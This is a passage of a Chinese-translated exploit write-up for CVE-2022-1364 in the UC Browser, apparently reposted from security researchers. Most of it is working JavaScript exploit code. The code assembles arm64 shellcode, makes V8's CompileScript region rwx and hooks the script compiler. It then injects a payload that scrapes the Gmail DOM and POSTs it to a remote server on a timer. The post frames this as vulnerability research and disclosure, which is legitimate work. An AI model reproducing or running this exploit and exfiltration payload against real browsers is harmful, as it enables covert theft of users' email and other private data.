至于实际的 shellcode，它首先会将内存区域与“unsubscribe”字符串进行比较，就像 Frida 中之前的 ` find_entrypoint`函数所做的那样。如果找不到匹配项，它会提前退出，因此我们的补丁只会应用于我们试图覆盖的字符串。接下来，假设我们找到的是正确的字符串，我们只需将之前获取的 js_payload 字符串复制到解释器函数处理的字符串即可。  
  
```
```js    /// Big-Endian/Little-Endian Conversion    functionreverse_bytes(val) {        val = BigInt(val);        v1 = val & 0xffn;        v2 = (val & 0xff00n) >> 8n;        v3 = (val & 0xff0000n) >> 16n;        v4 = (val & 0xff000000n) >> 24n;        returnNumber(v4 + (v3 << 8n) + (v2 << 16n) + (v1 << 24n));    }    // Setup code at 0x41410000 to set `libwebview+0x01eea000` to rwx    let shellcode_start_addr = 0x0;   {        /*            sub sp, sp, #0x20            stp x6, x7, [sp]            stp x8, x9, [sp,#0x10]       */        let start_seq = [i_sub_sp_sp_0x20, i_stp_x6_x7_sp, i_stp_x8_x9_sp_0x10]        /*            Need to execute instructions that we overwrite with the hook-code and then return to continue correct execution            ; Restore registers used in shellcode            ldp x6, x7, [sp]            ldp x8, x9, [sp, #0x10]            add sp, sp, #0x20            ; Restored instructions overwritten by the `CompileScript` hook            mrs x21, tpidr_e10            ldr x8, [x21, #0x28]            mov x27, x5            mov x22, x1            mov w28, w2            ret        */        let ret_seq = [i_ldp_x6_x7_sp, i_ldp_x8_x9_sp_0x10, i_add_sp_sp_0x20]        ret_seq = ret_seq.concat([i_mrs_x21_tpidr_e10, i_ldr_x8_x21_0x28, i_mov_x27_x5, i_mov_x22_x1, i_mov_w28_w2, i_ret])        /*            ; Can't overwrite x0, x1, x2, x5, x29, x30            <start_seq> ; 3 instructions            ; Retrieve js code in x1 and compare to see if its the js code we want to hook,             ; if yes replace with our payload, if not, return            ldr x7, [x1]            ldr x8, [x7, #0x38]            cbz x8, .skip ; Sometimes in frida x8 is 0 here, so add a check            ldur x9, [x8, #0x19]            mov x7, #0x75736e75 ; "unsu"            cmp w7, w9            b.eq #0x20            .skip:            <ret_seq> ; 8 instructions            <padding> ; 4 instructions            mov x7, js_payload_addr            add x8, x8, #0xd                        ; Memcpy x7 to x8            .L1                ldrb w6, [x7]                strb w6, [x8]                cbz w6, #0x30                add x7, x7, #1                add x8, x8, #1                add x0, x0, #0                b .L1            <padding> ; 9 instructions            <ret_seq> ; 8 instructions            <padding> ; to 80 instruction total length       */        let sc2 = start_seq;        sc2 = sc2.concat([i_ldr_x7_x1, i_ldr_x8_x7_0x38, i_cbz_x8_0x28, i_ldur_x9_x8_0x19]);        sc2 = sc2.concat(generate_mov_x7_imm(BigInt(0x75736e75))); // 'unsu'        sc2 = sc2.concat([i_cmp_w7_w9, i_beq_0x4c]);        sc2 = sc2.concat(ret_seq);        sc2 = sc2.concat([i_padding, i_padding, i_padding, i_padding]);        sc2 = sc2.concat(generate_mov_x7_imm(BigInt(js_payload_addr)));        sc2.push(i_add_x8_x8_0xd)        let memcpy = [i_ldrb_w6_x7, i_strb_w6_x8, i_cbz_w6_0x5c, i_add_x7_x7_0x1, i_add_x8_x8_0x1, i_nop, i_b_0x1c];        sc2 = sc2.concat(memcpy)        sc2 = sc2.concat([i_padding, i_padding, i_padding, i_padding, i_padding]);        sc2 = sc2.concat([i_padding, i_padding, i_padding, i_padding]);        sc2 = sc2.concat(ret_seq);               while (sc2.length < 80) {            sc2.push(i_padding);        }        for (let i = 0; i < sc2.length; i++) {            sc2[i] = reverse_bytes(sc2[i]);        }        print("[+] Shellcode Constructed");        // Retrieve the address of the shellcode using addr_of and arb_write primitives        let sc_as_uint32_arr = newUint32Array(sc2);        let sc_as_uint32_arr_addr = addr_of(sc_as_uint32_arr)        let lower = BigInt(arb_read(sc_as_uint32_arr_addr + BigInt(56)));        let upper = BigInt(arb_read(sc_as_uint32_arr_addr + BigInt(60)));        shellcode_start_addr = (upper << 0x20n) + lower;        print("[+] Shellcode Start Address: " + hex(shellcode_start_addr));```
```  
  
  
现在距离完成漏洞利用只剩下几个步骤了。首先，我们需要将` CompileScript`函数的权限设置为读写执行 (rwx)，以便应用我们的补丁。接下来，我们将刚刚设置的 shellcode 数组也设置为可执行，这样我们就可以实际执行它了。  
  
最后，我们执行实际的 ` CompileScript`覆盖，以执行钩子。  
  
```
```jsfunctionexploit() {    //...    {        /*           ; Mprotect CompileScript function to rwx           mov x0, (v8::V8ScriptRunner::CompileScript & !0xfff)           mov x1, #0x1000 // #4096           mov x2, #0x7 // #7           mov x8, #0xe2 // #226 (mprotect)           svc #0x0           ; Mprotect shellcode-array to rwx           mov x0, shellcode_start_addr           mov x1, #0x1000 // #4096           mov x2, #0x7 // #7           mov x8, #0xe2 // #226 (mprotect)           svc #0x0           ret        */        let mprot1 = generate_mov_x0_imm(BigInt(libwebview_base + v8_V8ScriptRunner_CompileScript_offset) & ~0xfffn)        mprot1 = mprot1.concat([i_mov_x1_0x1000, i_mov_x2_0x7, i_mov_x8_0xe2, i_svc_0x0]);        let mprot2 = generate_mov_x0_imm(shellcode_start_addr & ~0xfffn)        mprot2 = mprot2.concat([i_mov_x1_0x1000, i_mov_x2_0x7, i_mov_x8_0xe2, i_svc_0x0, i_ret]);        let sc = mprot1.concat(mprot2)        big_write(0x41410000n, sc);   }    // Call the 2nd rwx stub, this stub calls the 2nd shellcode payload at 0x41410000 that sets the    // compile-function and the shellcode array to rwx    {        print("[+] Calling f2");        f2();        print("[+] Returned from f2");    }    // Overwrite libwebview to call the shellcode array    {        /*            mov x7, shellcode_start_addr            blr x7        */        let sc = generate_mov_x7_imm(shellcode_start_addr)        sc.push(i_blr_x7);        // 0x24 offset are instructions that we overwrite for our hook. These don't interact with        // memory and are thus easiest to just execute in our shellcode after the hook        big_write(libwebview_base + v8_V8ScriptRunner_CompileScript_offset + 0x24n, sc);        print("[+] Finished patching interpreter with hook to shellcode");    }    print("[+] Interpreter Patch Exploit Complete");}```
```  
  
  
综上所述，我们使用 wasm 实例分配一些读写执行 (rwx) 区域。我们利用这些小的代码段来分配更多 rwx 区域，并将 ` CompileScript`函数设置为 rwx 权限。接下来，我们设置 shellcode，使其找到要覆盖的 js 字符串并执行 memcpy 操作。最后，我们通过修改 ScriptCompiler 来调用钩子，从而完成漏洞利用。  
  
现在只剩下一些小细节需要说明。首先是 ` generate_mov_x7_imm`函数，你可能已经注意到它在 shellcode 中被调用了好几次。实际上，我们需要在很多情况下向 shellcode 传递地址和值。这个函数会手动汇编几条 arm64 指令，用于在 shellcode 中设置一个寄存器，并赋予它我们选择的值。或许还有其他解决方案，例如将这些值写入 shellcode 可以加载的内存地址，但这种方案在内存限制下更加简洁，而且实现起来也很有趣。  
  
```
```js    /*        Arm64 does not allow `mov reg, imm64` instrucitons, so this is instead split into 5         instructions. This would look something like this for 0x123456789abcdef0            movz x7, #0x1234, lsl #48            movk x7, #0x5678, lsl #32            movk x7, #0x9abc, lsl #16            movk x7, #0xdef0        Returns an array of 4 instructions corresponding to the above for `imm_64`    */    functiongenerate_mov_x7_imm(imm_64) {        let imm_1 = (imm_64 & 0xffff000000000000n) >> 48n;        let imm_2 = (imm_64 & 0x0000ffff00000000n) >> 32n;        let imm_3 = (imm_64 & 0x00000000ffff0000n) >> 16n;        let imm_4 = imm_64 & 0x000000000000ffffn;        let ins_op1 = "11010010"        let ins_op2 = "11110010"        let ins_end = "00111"        let i1 = (imm_1 & 0b111n).toString(2).padStart(3, "0") + ins_end + ((imm_1 & 0b11111111000n) >> 3n).toString(2).padStart(8, "0") + "111" + ((imm_1 & 0b1111100000000000n) >> 11n).toString(2).padStart(5, "0") + ins_op1        let i2 = (imm_2 & 0b111n).toString(2).padStart(3, "0") + ins_end + ((imm_2 & 0b11111111000n) >> 3n).toString(2).padStart(8, "0") + "110" + ((imm_2 & 0b1111100000000000n) >> 11n).toString(2).padStart(5, "0") + ins_op2        let i3 = (imm_3 & 0b111n).toString(2).padStart(3, "0") + ins_end + ((imm_3 & 0b11111111000n) >> 3n).toString(2).padStart(8, "0") + "101" + ((imm_3 & 0b1111100000000000n) >> 11n).toString(2).padStart(5, "0") + ins_op2        let i4 = (imm_4 & 0b111n).toString(2).padStart(3, "0") + ins_end + ((imm_4 & 0b11111111000n) >> 3n).toString(2).padStart(8, "0") + "100" + ((imm_4 & 0b1111100000000000n) >> 11n).toString(2).padStart(5, "0") + ins_op2        return [parseInt(i1, 2), parseInt(i2, 2), parseInt(i3, 2), parseInt(i4, 2)]    }```
```  
  
  
最后，我们来看看实际注入的用于对 Gmail 进行 XSS 攻击的 js_payload。这段代码基本上就是遍历 Gmail 的 DOM 树，将数据聚合到一个 JSON 对象中，然后使用 fetch 请求将其发送到远程服务器。这可以用来泄露电子邮件收件箱中的数据，如下所示。添加分号（` ; `）是为了用有效的 JavaScript 代码覆盖字节，并保持 js_payload 的长度与之前存储的脚本长度相同。如前所述，这样做是为了避免有效负载长度元数据出现问题，并防止覆盖操作在原始 JavaScript 代码中的某个关键字中间停止时出现语法错误。  
  
要真正利用漏洞，你可能需要对此进行大幅扩展，但我认为这已经很好地展示了在没有站点隔离的情况下可以做什么，尤其是在浏览器几个月甚至几年都不修补 V8 漏洞的情况下。  
  
```
```js/// Needs to manually be padded to 0x979 - 0xd bytes. This overwrites characters at the end of the /// payload that previously existed there and would cause a crash. Use python to generate and copy/// paste otherwise the string gets reallocated when dynamically added/// ';' * max(0, 0x97c - 0xd - 0x34f)let js_payload = `    functionf_wrap() {        functionff_(vv_) {          if (vv_.tagName == "SCRIPT") {            return {}          }          let oo_={            id: vv_.id,            class: vv_.className,            zz_: vv_.tagName,            cc_: [],            aa_: {},            tt_: vv_.innerText          };          for (let attr of vv_.attributes || []) {            oo_.aa_[attr.name] = attr.value;          }          for (let child of vv_.children) {            oo_.cc_.push(ff_(child));          }            return oo_;        }                fetch("https://192.168.1.246:5000/api/message", {          method: "POST",          headers: {            "Content-Type": "application/json"          },          body: JSON.stringify({ message: ff_(document.body) })        });    }    setInterval(f_wrap, 3000);;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;`;```
```  
  
  
首先，用户访问包含漏洞利用代码的页面。此时，浏览器已被植入恶意程序，以便后续提取数据。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taeC4M3pg4ia9BBKA0IFToyFwFNIHW78bsZGQKlZXUUFyVhRGbaQs99RQ62PyqM5kfVhMctrHcquzFw/640?wx_fmt=png&from=appmsg "")  
  
稍后，当用户访问感兴趣的网站（例如此处显示的 Gmail 收件箱）时，先前注入的有效载荷会执行以提取数据并将其发送到外部服务器，如[#3所示]()  
。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taeC4M3pg4ia9BBKA0IFToyFwq4gPIzRzVBPboCxXsicz9CFqJibc3icLYtCj4flP6gSmsdkVJreISMGXA/640?wx_fmt=png&from=appmsg "")  
  
提取的收件箱数据在服务器端接收。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taeC4M3pg4ia9BBKA0IFToyFwIYpmv3XvNOdtsNM18oy7B7tpfekZy9BPZRH5Qc6bC2qpSLoaiaMtia2Q/640?wx_fmt=png&from=appmsg "")  
  
您可以在这里找到完整的漏洞利用代码：https://github.com/interruptlabs/uc_browser_poc_CVE-2022-1364  
  
结论  
  
仔细研究这款浏览器后，令人遗憾的是，其安全性令人担忧。UCWeb 似乎更注重添加新功能，却忽视了定期更新（其版本更新已落后当前版本一年多），甚至主动选择不支持站点隔离等安全功能。这使得该浏览器极易受到攻击，因为过去一年中任何已知的 Google Chrome CVE 漏洞都可能被利用，并被用于拦截电子邮件、银行账户数据或浏览器中存储的任何其他信息。  
  
好了，这篇实验室日志就到这里。由于缺乏合适的调试环境，这个闭源浏览器研究项目遇到了很多困难。希望大家喜欢看我们克服重重挑战，最终完成这个漏洞利用的过程。我要感谢Interrupt Labs的同事们在这个项目中提供的帮助，尤其要感谢Axel "0vercl0k" Souchet，我们一起进行了多次长时间的调试，解决了漏洞利用过程中遇到的各种问题。  
  
**END**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rWGOWg48taeC4M3pg4ia9BBKA0IFToyFwawK9Iw1G5Q8uOGRXicMG6xzicYyoZPTibLe0STN3uatwAgibYxjEaBCEnw/640?wx_fmt=jpeg&from=appmsg "")  
  
  
公众号内容都来自国外平台-所有文章可通过点击阅读原文到达原文地址或参考地址  
  
排版 编辑 | Ots 小安   
  
采集 翻译 | Ots Ai牛马  
  
公众号 |   
AnQuan7 (Ots安全)  
  
